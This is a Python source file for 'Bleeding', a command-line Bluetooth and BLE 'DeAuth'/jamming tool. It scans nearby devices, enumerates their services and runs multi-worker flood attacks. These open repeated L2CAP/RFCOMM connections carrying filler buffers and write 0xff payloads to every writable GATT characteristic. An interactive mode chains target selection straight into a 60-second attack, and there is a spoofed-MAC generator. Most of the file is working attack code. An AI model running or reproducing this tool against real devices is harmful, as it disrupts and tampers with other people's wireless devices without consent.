#!/usr/bin/env python3
"""
Bleeding: Bluetooth/BLE DeAuth and Analysis Tool
Consolidated single-file version with modular internal structure.
"""

import sys
import os
import time
import random
import platform
import multiprocessing
import click
from enum import Enum, unique
from colorama import Fore, init

# Conditional imports :)
try:
    import bluetooth
    PYBLUEZ_AVAILABLE = True
except ImportError:
    PYBLUEZ_AVAILABLE = False

try:
    import asyncio
    from bleak import BleakScanner, BleakClient
    BLEAK_AVAILABLE = True
except ImportError:
    BLEAK_AVAILABLE = False

# ============================================================================
# CONSTANTS
# ============================================================================

DEFAULT_BT_INTERFACE = "hci0"
DEFAULT_BT_PROTOCOL = "l2cap"
DEFAULT_BUFFER_SIZE = 512
L2CAP_PSM_HCI = 0x1001

MAC_MIN = 0x00
MAC_MAX = 0xff

VENDORS_OUI = {
    "acer": "C0:98:79",
    "apple": "FC:FC:48",
    "asus": "FC:C2:33",
    "dell": "D8:D0:90",
    "google": "F8:8F:CA",
    "hp": "B0:5C:DA",
    "htc": "98:0D:2E",
    "intel": "FC:F8:AE",
    "lenovo": "A4:8C:DB",
    "lg": "F8:A9:D0",
    "microsoft": "C4:9D:ED",
    "motorola": "F8:F1:B6",
    "samsung": "FC:F1:36",
    "sony": "D4:38:9C",
    "toshiba": "EC:21:E5",
    "xiaomi": "FC:64:BA",
}

# ============================================================================
# ENUMS
# ============================================================================

@unique
class BTProtocol(Enum):
    """Bluetooth protocol types"""
    l2cap = 'L2CAP'
    rfcomm = 'RFCOMM'
    
    def get_pybluez_value(self):
        """Get the pybluez constant value"""
        if not PYBLUEZ_AVAILABLE:
            raise RuntimeError("PyBluez is not available")
        if self == BTProtocol.l2cap:
            return bluetooth.L2CAP
        elif self == BTProtocol.rfcomm:
            return bluetooth.RFCOMM
        else:
            raise ValueError(f"Unknown protocol: {self}")

# ============================================================================
# SYSTEM UTILITIES
# ============================================================================

def get_vcores():
    """Get the number of virtual cores"""
    return os.cpu_count()

def is_linux():
    """Check if running on Linux"""
    return platform.system() == 'Linux'

def is_windows():
    """Check if running on Windows"""
    return platform.system() == 'Windows'

def is_ble_supported():
    """Check if BLE is supported on this platform"""
    return BLEAK_AVAILABLE

def check_ble_available():
    """Check if BLE is available and raise error if not"""
    if not BLEAK_AVAILABLE:
        log_err("BLE support requires 'bleak' library. Install with: pip install bleak")
        sys.exit(1)

def check_bredr_available():
    """Check if BR/EDR is available and raise error if not"""
    if not PYBLUEZ_AVAILABLE:
        log_err("BR/EDR support requires 'pybluez' library.")
        sys.exit(1)

# ============================================================================
# MAC ADDRESS UTILITIES
# ============================================================================

def random_mac_head():
    """Generate random MAC address head from vendor OUI"""
    return random.choice(list(VENDORS_OUI.values()))

def random_mac_tail():
    """Generate random MAC address tail (last 3 bytes)"""
    last_bytes = [random.randint(MAC_MIN, MAC_MAX) for _ in range(3)]
    return ':'.join(map(lambda x: format(x, '02x'), last_bytes))

def random_mac():
    """Generate a complete random MAC address"""
    return random_mac_head() + ":" + random_mac_tail()

def random_mac_all_vendors():
    """Generate random MAC addresses for all vendors"""
    return [[vendor, VENDORS_OUI[vendor] + ":" + random_mac_tail()] 
            for vendor in VENDORS_OUI.keys()]

# ============================================================================
# CLI UTILITIES
# ============================================================================

class EnumType(click.Choice):
    """Custom Click type for Enum values"""
    def __init__(self, enum):
        self.__enum = enum
        super().__init__(enum.__members__)

    def convert(self, value, param, ctx):
        return self.__enum[super().convert(value, param, ctx)]

# ============================================================================
# ASYNC UTILITIES
# ============================================================================

def create_async_task(threads: int, func, args=(), timeout=None):
    """Create and manage a pool of worker threads"""
    log_info("")
    log_info(f"Starting thread pool with <cyan>{threads} workers...")
    if timeout:
        log_info(f"Attack will run for <cyan>{timeout} seconds...")
    time.sleep(1)

    start_time = time.time()
    pool = multiprocessing.Pool(processes=threads)
    
    try:
        # Start all workers
        for worker_id in range(threads):
            worker_args = args + (worker_id,)
            pool.apply_async(func, args=worker_args)
        
        # Wait for timeout or KeyboardInterrupt
        while True:
            try:
                time.sleep(1)
                # Check timeout
                if timeout and (time.time() - start_time) >= timeout:
                    log_info(f"\n<lgreen>Timeout reached ({timeout}s). Stopping attack...")
                    break
            except KeyboardInterrupt:
                log_info("\n<lyellow>Interrupted by user...")
                break
    finally:
        log_info("Stopping threads...")
        pool.close()
        pool.terminate()
        pool.join()
    
    if not timeout:
        exit(1)

# ============================================================================
# PRINT BORDERED UTILITIES
# ============================================================================

BORDERED_WIDTH = 38  # Width without borders

def print_bordered(text: str, color=Fore.CYAN):
    """Print a bordered banner with centered text"""
    # Calculate padding for centering
    text_len = len(text)
    if text_len >= BORDERED_WIDTH:
        # Text is too long, truncate
        centered_text = text[:BORDERED_WIDTH]
    else:
        # Center the text
        padding_total = BORDERED_WIDTH - text_len
        padding_left = padding_total // 2
        padding_right = padding_total - padding_left
        centered_text = " " * padding_left + text + " " * padding_right
    
    print(f"{color}╔══════════════════════════════════════╗{Fore.RESET}")
    print(f"{color}║{centered_text}║{Fore.RESET}")
    print(f"{color}╚══════════════════════════════════════╝{Fore.RESET}")

# ============================================================================
# LOGGER
# ============================================================================

class Logger:
    """Centralized logging with color support"""
    
    def __init__(self):
        self.headless = False
        self.color_map = {
            "<black>": Fore.BLACK, "<blue>": Fore.BLUE, "<cyan>": Fore.CYAN,
            "<green>": Fore.GREEN, "<magenta>": Fore.MAGENTA, "<red>": Fore.RED,
            "<white>": Fore.WHITE, "<yellow>": Fore.YELLOW,
            "<lblack>": Fore.LIGHTBLACK_EX, "<lblue>": Fore.LIGHTBLUE_EX,
            "<lcyan>": Fore.LIGHTCYAN_EX, "<lgreen>": Fore.LIGHTGREEN_EX,
            "<lmagenta>": Fore.LIGHTMAGENTA_EX, "<lred>": Fore.LIGHTRED_EX,
            "<lwhite>": Fore.LIGHTWHITE_EX, "<lyellow>": Fore.LIGHTYELLOW_EX,
            "<reset>": Fore.RESET
        }
    
    def set_headless(self, headless: bool):
        """Enable/disable headless mode"""
        self.headless = headless
    
    def format(self, message: str) -> str:
        """Format message with color codes or strip them in headless mode"""
        if self.headless:
            for tag in self.color_map.keys():
                message = message.replace(tag, "")
            return message
        
        for tag, color in self.color_map.items():
            message = message.replace(tag, color)
        return message
    
    def err(self, message: str):
        """Log error message"""
        if self.headless and message == "":
            return
        prefix = "ERR " if self.headless else f"{Fore.RED}ERR   {Fore.RESET}"
        print(f"{prefix}{self.format(message)}")
    
    def warn(self, message: str):
        """Log warning message"""
        if self.headless and message == "":
            return
        prefix = "WARN " if self.headless else f"{Fore.YELLOW}WARN  {Fore.RESET}"
        print(f"{prefix}{self.format(message)}")
    
    def info(self, message: str):
        """Log info message"""
        if self.headless and message == "":
            return
        prefix = "INFO " if self.headless else f"{Fore.CYAN}INFO  {Fore.RESET}"
        print(f"{prefix}{self.format(message)}")

# Global logger instance
logger = Logger()

# Convenience functions
def log_err(message: str):
    logger.err(message)

def log_warn(message: str):
    logger.warn(message)

def log_info(message: str):
    logger.info(message)

# ============================================================================
# CORE MODULES: DISCOVERY (RAW)
# ============================================================================

def bredr_scan():
    """Raw BR/EDR scan: returns list of devices without logging"""
    check_bredr_available()
    nearby_devices = bluetooth.discover_devices(lookup_names=True, duration=5, flush_cache=True, lookup_class=True)
    devices = []
    for addr, name, dev_class in nearby_devices:
        devices.append({
            'address': addr,
            'name': name if name else "Unknown",
            'class': dev_class,
            'type': 'BR/EDR'
        })
    return devices

def ble_scan():
    """Raw BLE scan: returns list of devices without logging"""
    check_ble_available()
    
    async def _scan_ble():
        devices = []
        try:
            log_info("Starting BLE scan (5 seconds)...")
            scanner_devices = await BleakScanner.discover(timeout=5.0, return_adv=True)
            
            if not scanner_devices:
                log_warn("BLE scan completed but no devices found")
                return devices
            
            log_info(f"Found {len(scanner_devices)} BLE device(s)")
            for address, (device, adv_data) in scanner_devices.items():
                devices.append({
                    'address': address,
                    'name': device.name if device.name else "Unknown",
                    'class': None,
                    'type': 'BLE',
                    'rssi': adv_data.rssi if hasattr(adv_data, 'rssi') else None
                })
        except Exception as e:
            log_err(f"BLE scan failed: {e}")
        
        return devices
    
    return asyncio.run(_scan_ble())

def scan(use_ble=False):
    """
    Unified scan function that routes to appropriate implementation.
    Returns normalized list of devices.
    """
    if use_ble:
        log_info("Scanning for BLE devices...")
        devices = ble_scan()
    else:
        log_info("Scanning for BR/EDR devices...")
        devices = bredr_scan()
    
    # Display results
    for device in devices:
        if device.get('rssi'):
            log_info(f" <lblack>* <reset>{device['address']} <lgreen>({device['name']}) <lblack>[RSSI: {device['rssi']}]")
        elif device.get('class'):
            log_info(f" <lblack>* <reset>{device['address']} <lgreen>({device['name']}) <lblack>[Class: {device['class']}]")
        else:
            log_info(f" <lblack>* <reset>{device['address']} <lgreen>({device['name']})")
    
    return devices

# ============================================================================
# CORE MODULES: ENUMERATION (RAW)
# ============================================================================

def bredr_enum_services(device_addr: str):
    """Raw BR/EDR enumerate: returns list of services without logging"""
    check_bredr_available()
    services = bluetooth.find_service(address=device_addr)
    
    service_list = []
    for service in services:
        name = service.get('name')
        if name is None:
            name = "Unknown"
        elif isinstance(name, bytes):
            name = name.decode('utf-8', errors='ignore')
        
        service_list.append({
            'name': name,
            'description': service.get('description', 'N/A'),
            'protocol': service.get('protocol', 'Unknown'),
            'provider': service.get('provider', 'N/A'),
            'port': service.get('port', 0),
            'uuid': service.get('service-id', 'N/A')
        })
    
    return service_list

def ble_enum_services(device_addr: str):
    """Raw BLE enumerate: returns list of services without logging"""
    check_ble_available()
    
    async def _enum_ble():
        service_list = []
        client = None
        try:
            log_info(f"Connecting to BLE device {device_addr}...")
            client = BleakClient(device_addr, timeout=15.0)
            await client.connect()
            
            if not client.is_connected:
                log_err("Failed to connect to BLE device")
                return service_list
            
            log_info("Connected! Discovering GATT services...")
            
            # Ensure services are resolved
            if not client.services:
                log_warn("No services discovered, waiting for service resolution...")
                await asyncio.sleep(1)
            
            services = client.services
            if not services:
                log_warn("No GATT services found on device")
                return service_list
            
            log_info(f"Found {len(services.services)} GATT service(s)")
            
            # Get all services
            for service in services:
                service_info = {
                    'name': service.description if service.description else "Unknown",
                    'description': f"UUID: {service.uuid}",
                    'protocol': 'GATT',
                    'provider': 'BLE',
                    'port': 0,
                    'uuid': service.uuid,
                    'characteristics': []
                }
                
                # Get characteristics for this service
                for char in service.characteristics:
                    char_info = {
                        'uuid': char.uuid,
                        'description': char.description if char.description else "Unknown",
                        'properties': char.properties
                    }
                    service_info['characteristics'].append(char_info)
                
                service_list.append(service_info)
            
            log_info(f"Successfully enumerated {len(service_list)} service(s)")
            
        except asyncio.TimeoutError:
            log_err(f"Timeout connecting to BLE device {device_addr}")
        except Exception as e:
            log_err(f"Failed to enumerate BLE services: {e}")
        finally:
            if client and client.is_connected:
                await client.disconnect()
                log_info("Disconnected from BLE device")
        
        return service_list
    
    return asyncio.run(_enum_ble())

def enum_services(device: str, use_ble=False):
    """
    Unified enumeration function that routes to appropriate implementation.
    Returns normalized list of services.
    """
    log_info(f"Enumerating services for {device}...")
    
    if use_ble:
        services = ble_enum_services(device)
    else:
        services = bredr_enum_services(device)
    
    if len(services) == 0:
        log_warn("No services found.")
        return services
    
    log_info("Services found:")
    for service in services:
        log_info(f"> <cyan>{service['name']}")
        log_info(f"    <lblack>* <reset>Description: <lgreen>{service['description']}")
        log_info(f"    <lblack>* <reset>Protocol: <lgreen>{service['protocol']}")
        log_info(f"    <lblack>* <reset>Provider: <lgreen>{service['provider']}")
        if service.get('port', 0) > 0:
            log_info(f"    <lblack>* <reset>Port: <lgreen>{service['port']}")
        log_info(f"    <lblack>* <reset>UUID: <lgreen>{service['uuid']}")
        
        # Display characteristics for BLE
        if 'characteristics' in service and service['characteristics']:
            log_info(f"    <lblack>* <reset>Characteristics:")
            for char in service['characteristics']:
                log_info(f"        <lblack>- <reset>{char['description']} <lblack>[{char['uuid']}]")
                log_info(f"          <lblack>Properties: <reset>{', '.join(char['properties'])}")
        print("")
    
    return services

# ============================================================================
# CORE MODULES: DEAUTH
# ============================================================================

def bredr_deauth(target: str, port: int, protocol: BTProtocol, packet_size: int, worker_id: int):
    """Execute BR/EDR deauth attack on a single worker thread"""
    check_bredr_available()
    worker = f"Worker-{str(worker_id).zfill(2)}"
    job_id = 0

    while True:
        job = f"Job-{job_id}"
        prefix = f" <lblack>[{worker} | {job}]<reset>    "
        
        # Create socket
        log_info(f"{prefix}Connecting <lgreen>{target}<reset> using <lgreen>{protocol.name.upper()}<reset> protocol (Port <lgreen>{port}<reset>)...")
        sock = bluetooth.BluetoothSocket(protocol.get_pybluez_value())  
        bd_dev = (target, port)
        
        # Connect and send
        try:
            sock.connect(bd_dev)
            sock.settimeout(10)
            
            # Send deauth packet
            payload = b'\x01' * packet_size
            log_info(f"{prefix}Sending deauth packets to <lgreen>{target}<reset> (<lgreen>{len(payload)} buffer size<reset>) ...")
            sock.send(payload)
        except bluetooth.BluetoothError as e:
            log_err(f"{prefix}<lred>Failed to connect to {target}: {e}")
            break
        finally:
            sock.close()
        
        time.sleep(1)
        job_id += 1

def ble_deauth_worker(target: str, packet_size: int, worker_id: int):
    """Execute BLE deauth attack on a single worker thread"""
    check_ble_available()
    worker = f"Worker-{str(worker_id).zfill(2)}"
    job_id = 0
    
    async def _ble_deauth_job():
        nonlocal job_id
        while True:
            job = f"Job-{job_id}"
            prefix = f" <lblack>[{worker} | {job}]<reset>    "
            
            try:
                log_info(f"{prefix}Connecting to BLE device <lgreen>{target}<reset>...")
                async with BleakClient(target, timeout=10.0) as client:
                    log_info(f"{prefix}Connected! Flooding with <lgreen>{packet_size}<reset> byte packets...")
                    
                    # Get writable characteristics
                    writable_chars = []
                    for service in client.services:
                        for char in service.characteristics:
                            if "write" in [prop.lower() for prop in char.properties]:
                                writable_chars.append(char.uuid)
                    
                    if not writable_chars:
                        log_warn(f"{prefix}No writable characteristics found!")
                        break
                    
                    # Send packets to writable characteristics
                    payload = b'\xff' * packet_size
                    for char_uuid in writable_chars:
                        try:
                            await client.write_gatt_char(char_uuid, payload, response=False)
                            log_info(f"{prefix}Sent packet to characteristic <lgreen>{char_uuid}<reset>")
                        except Exception as e:
                            log_err(f"{prefix}Failed to write to {char_uuid}: {e}")
                    
            except Exception as e:
                log_err(f"{prefix}<lred>Failed to connect to {target}: {e}")
                break
            
            await asyncio.sleep(1)
            job_id += 1
    
    asyncio.run(_ble_deauth_job())

def deauth(target: str, port: int, protocol: BTProtocol, packet_size: int, threads: int, use_ble: bool, timeout=None):
    """
    Unified deauth function that routes to appropriate implementation.
    """
    if use_ble:
        log_info("Initializing BLE DeAuth attack...")
        log_info(f"  Target:         <lblue>{target}")
        log_info(f"  Packet size:    <lblue>{packet_size}")
        log_info(f"  Threads:        <lblue>{threads}")
        if timeout:
            log_info(f"  Duration:       <lblue>{timeout} seconds")
        
        create_async_task(threads, ble_deauth_worker, (target, packet_size), timeout)
    else:
        log_info("Initializing BR/EDR DeAuth attack...")
        log_info(f"  Target:         <lblue>{target}")
        log_info(f"  Port:           <lblue>{port}")
        log_info(f"  Protocol:       <lblue>{protocol.name}")
        log_info(f"  Packet size:    <lblue>{packet_size}")
        log_info(f"  Threads:        <lblue>{threads}")
        if timeout:
            log_info(f"  Duration:       <lblue>{timeout} seconds")
        
        create_async_task(threads, bredr_deauth, (target, port, protocol, packet_size), timeout)

# ============================================================================
# INTERACTIVE MODE
# ============================================================================

def discover_interactive(use_ble=False):
    """Discover devices and return list (uses raw function)"""
    mode = "BLE" if use_ble else "BR/EDR"
    print_bordered(f"Scanning for {mode} devices...")
    print()
    
    if use_ble:
        devices = ble_scan()
    else:
        devices = bredr_scan()
    
    if not devices:
        log_err("No devices found!")
        return []
    
    return devices

def enum_services_interactive(device_addr: str, use_ble=False):
    """Enumerate services and return list (uses raw function)"""
    print()
    print_bordered("Enumerating services...")
    print()
    
    if use_ble:
        services = ble_enum_services(device_addr)
    else:
        services = bredr_enum_services(device_addr)
    
    if not services:
        log_err("No services found!")
        return []
    
    return services

def select_from_menu(items, item_type="item"):
    """Generic function to display menu and get selection"""
    if not items:
        return None
    
    print(f"{Fore.YELLOW}Available {item_type}s:{Fore.RESET}")
    
    for idx, item in enumerate(items, 1):
        if item_type == "device":
            print(f"  {Fore.LIGHTBLACK_EX}[{idx}]{Fore.RESET} {Fore.LIGHTGREEN_EX}{item['address']}{Fore.RESET} - {Fore.CYAN}{item['name']}{Fore.RESET}")
        elif item_type == "service":
            print(f"  {Fore.LIGHTBLACK_EX}[{idx}]{Fore.RESET} {Fore.LIGHTGREEN_EX}{item['name']}{Fore.RESET} | Port: {Fore.YELLOW}{item['port']}{Fore.RESET} | Protocol: {Fore.CYAN}{item['protocol']}{Fore.RESET}")
    
    print(f"  {Fore.LIGHTBLACK_EX}[0]{Fore.RESET} {Fore.RED}Exit{Fore.RESET}")
    
    while True:
        try:
            choice = input(f"\n{Fore.CYAN}Select {item_type} [0-{len(items)}]:{Fore.RESET} ").strip()
            choice_num = int(choice)
            
            if choice_num == 0:
                return None
            if 1 <= choice_num <= len(items):
                return items[choice_num - 1]
            else:
                print(f"{Fore.RED}Invalid selection. Try again.{Fore.RESET}")
        except ValueError:
            print(f"{Fore.RED}Please enter a valid number.{Fore.RESET}")
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Cancelled by user.{Fore.RESET}")
            return None

def interactive_mode(use_ble=False):
    """Interactive TUI mode for device discovery, service enumeration, and attack"""
    
    mode = "BLE" if use_ble else "BR/EDR"
    log_info(f"Starting BLEeding with Interactive Mode ({mode})")
    print()
    
    # Step 1: Discover devices
    devices = discover_interactive(use_ble)
    if not devices:
        return
    
    # Step 2: Select device
    selected_device = select_from_menu(devices, "device")
    if not selected_device:
        log_info("Exiting interactive mode...")
        return
    
    device_addr = selected_device['address']
    device_name = selected_device['name']
    
    print(f"{Fore.GREEN}✓ Selected device:{Fore.RESET} {Fore.LIGHTGREEN_EX}{device_name}{Fore.RESET} ({Fore.CYAN}{device_addr}{Fore.RESET})")
    
    # Step 3: Enumerate services
    services = enum_services_interactive(device_addr, use_ble)
    if not services:
        return
    
    # Step 4: Select service
    selected_service = select_from_menu(services, "service")
    if not selected_service:
        log_info("Exiting interactive mode...")
        return
    
    service_name = selected_service['name']
    service_port = selected_service.get('port', 0)
    service_protocol = selected_service['protocol']
    
    print(f"{Fore.GREEN}✓ Selected service:{Fore.RESET} {Fore.LIGHTGREEN_EX}{service_name}{Fore.RESET}")
    if service_port > 0:
        print(f"  {Fore.LIGHTBLACK_EX}Port:{Fore.RESET} {Fore.YELLOW}{service_port}{Fore.RESET}")
    print(f"  {Fore.LIGHTBLACK_EX}Protocol:{Fore.RESET} {Fore.CYAN}{service_protocol}{Fore.RESET}")
    
    # Step 5: Execute DeAuth attack for 60 seconds
    print()
    print_bordered("Starting DeAuth Attack (60s)...", color=Fore.RED)
    
    threads = get_vcores()
    packet_size = DEFAULT_BUFFER_SIZE
    
    if use_ble:
        # BLE attack
        log_info(f"Target:         <lblue>{device_addr} ({device_name})")
        log_info(f"Service:        <lblue>{service_name}")
        log_info(f"Packet size:    <lblue>{packet_size}")
        log_info(f"Threads:        <lblue>{threads}")
        log_info(f"Duration:       <lblue>60 seconds")
        
        deauth(device_addr, 0, BTProtocol.rfcomm, packet_size, threads, use_ble=True, timeout=60)
    else:
        # BR/EDR attack
        # Determine protocol
        try:
            if 'l2cap' in service_protocol.lower():
                protocol = BTProtocol.l2cap
            else:
                protocol = BTProtocol.rfcomm
        except:
            protocol = BTProtocol.rfcomm
        
        # Check Windows compatibility
        if protocol == BTProtocol.l2cap and is_windows():
            log_warn("L2CAP not supported on Windows. Using RFCOMM instead...")
            protocol = BTProtocol.rfcomm
        
        log_info(f"Target:         <lblue>{device_addr} ({device_name})")
        log_info(f"Service:        <lblue>{service_name}")
        log_info(f"Port:           <lblue>{service_port}")
        log_info(f"Protocol:       <lblue>{protocol.name}")
        log_info(f"Packet size:    <lblue>{packet_size}")
        log_info(f"Threads:        <lblue>{threads}")
        log_info(f"Duration:       <lblue>60 seconds")
        
        deauth(device_addr, service_port, protocol, packet_size, threads, use_ble=False, timeout=60)
    
    print(f"\n{Fore.GREEN}✓ Attack completed!{Fore.RESET}\n")

# ============================================================================
# CLI INTERFACE
# ============================================================================

def print_banner():
    """Print application banner"""
    print(Fore.RED + """
    ▄▄▄▄    ██▓    ▓█████ ▓█████ ▓█████▄  ██▓ ███▄    █   ▄████ 
    ▓█████▄ ▓██▒    ▓█   ▀ ▓█   ▀ ▒██▀ ██▌▓██▒ ██ ▀█   █  ██▒ ▀█▒
    ▒██▒ ▄██▒██░    ▒███   ▒███   ░██   █▌▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
    ▒██░█▀  ▒██░    ▒▓█  ▄ ▒▓█  ▄ ░▓█▄   ▌░██░▓██▒  ▐▌██▒░▓█  ██▓
    ░▓█  ▀█▓░██████▒░▒████▒░▒████▒░▒████▓ ░██░▒██░   ▓██░░▒▓███▀▒
    ░▒▓███▀▒░ ▒░▓  ░░░ ▒░ ░░░ ▒░ ░ ▒▒▓  ▒ ░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
    ▒░▒   ░ ░ ░ ▒  ░ ░ ░  ░ ░ ░  ░ ░ ▒  ▒  ▒ ░░ ░░   ░ ▒░  ░   ░ 
    ░    ░   ░ ░      ░      ░    ░ ░  ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
    ░          ░  ░   ░  ░   ░  ░   ░     ░           ░       ░ 
        ░                        ░                             
        
                        Bluetooth/BLE jamming
          """)

@click.group()
@click.option("--headless", default=False, is_flag=True, help="Headless mode (No colors and formatting)")
def main(headless: bool):
    """Bleeding: Bluetooth/BLE DeAuth and Analysis Tool"""
    logger.set_headless(headless)

@main.command("scan")
@click.option("--ble", "-b", default=False, is_flag=True, help="Scan for BLE devices")
def scan_cmd(ble: bool):
    """Scan for nearby Bluetooth or BLE devices"""
    if ble and not is_ble_supported():
        log_err("BLE not supported (bleak library not available)")
        exit(1)
    
    if not ble and not PYBLUEZ_AVAILABLE:
        log_err("BR/EDR not supported (pybluez library not available)")
        exit(1)
    
    scan(use_ble=ble)

@main.command("deauth")
@click.argument("target", required=True, type=str)
@click.option("--ble", "-b", default=False, is_flag=True, help="Use BLE mode")
@click.option("--port", "-p", default=L2CAP_PSM_HCI, help="Port to use (BR/EDR only)")
@click.option("--protocol", "-P", default=DEFAULT_BT_PROTOCOL, help="Protocol to use (BR/EDR only)", type=EnumType(BTProtocol))
@click.option("--size", "-s", default=DEFAULT_BUFFER_SIZE, help="Length of packets to send")
@click.option("--threads", "-t", default=get_vcores(), help="Threads count to use")
@click.option("--timeout", "-T", default=None, type=int, help="Attack duration in seconds (optional)")
def deauth_cmd(target: str, ble: bool, port: int, protocol: BTProtocol, size: int, threads: int, timeout: int):
    """Execute DeAuth attack on target device"""
    if ble and not is_ble_supported():
        log_err("BLE not supported (bleak library not available)")
        exit(1)
    
    if not ble and not PYBLUEZ_AVAILABLE:
        log_err("BR/EDR not supported (pybluez library not available)")
        exit(1)
    
    if not ble and protocol == BTProtocol.l2cap and is_windows():
        log_err("L2CAP protocol is not supported on Windows, please select RFCOMM using -P flag.")
        exit(1)
    
    deauth(target, port, protocol, size, threads, use_ble=ble, timeout=timeout)

@main.command("enum")
@click.argument("target", required=True, type=str)
@click.option("--ble", "-b", default=False, is_flag=True, help="Use BLE mode")
def enum_cmd(target: str, ble: bool):
    """Enumerate services on target device"""
    if ble and not is_ble_supported():
        log_err("BLE not supported (bleak library not available)")
        exit(1)
    
    if not ble and not PYBLUEZ_AVAILABLE:
        log_err("BR/EDR not supported (pybluez library not available)")
        exit(1)
    
    enum_services(target, use_ble=ble)

@main.command("random-mac")
def random_mac_cmd():
    """Generate random MAC addresses for all vendors"""
    log_info("Generating random MAC addresses...")
    macs = random_mac_all_vendors()
    
    for vendor, addr in macs:
        vendor_padded = vendor.ljust(10, " ")
        log_info(f" <lblack>* <reset>{vendor_padded}\t<lgreen>{addr}")

@main.command("i")
@click.option("--ble", "-b", default=False, is_flag=True, help="Use BLE mode")
def interactive_cmd(ble: bool):
    """Interactive mode: Scan, select device, enumerate services, and attack"""
    if ble and not is_ble_supported():
        log_err("BLE not supported (bleak library not available)")
        exit(1)
    
    if not ble and not PYBLUEZ_AVAILABLE:
        log_err("BR/EDR not supported (pybluez library not available)")
        exit(1)
    
    interactive_mode(use_ble=ble)

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def start():
    """Application entry point"""
    args = sys.argv[1:]
    headless = "--headless" in args
    
    if not headless:
        print_banner()
    
    try:
        main()
        exit(0)
    except Exception as e:
        print(f"Error: {e}")
        exit(1)

if __name__ == "__main__":
    # Required for multiprocessing to work correctly
    multiprocessing.freeze_support()
    
    # Check for Python 3.6 or newer
    python_version = sys.version_info
    
    # Init colorama
    init(autoreset=True)
    
    if python_version.major < 3 or (python_version.major == 3 and python_version.minor < 6):
        print("Bleeding requires Python 3.6 or newer.")
        sys.exit(1)
    
    start()

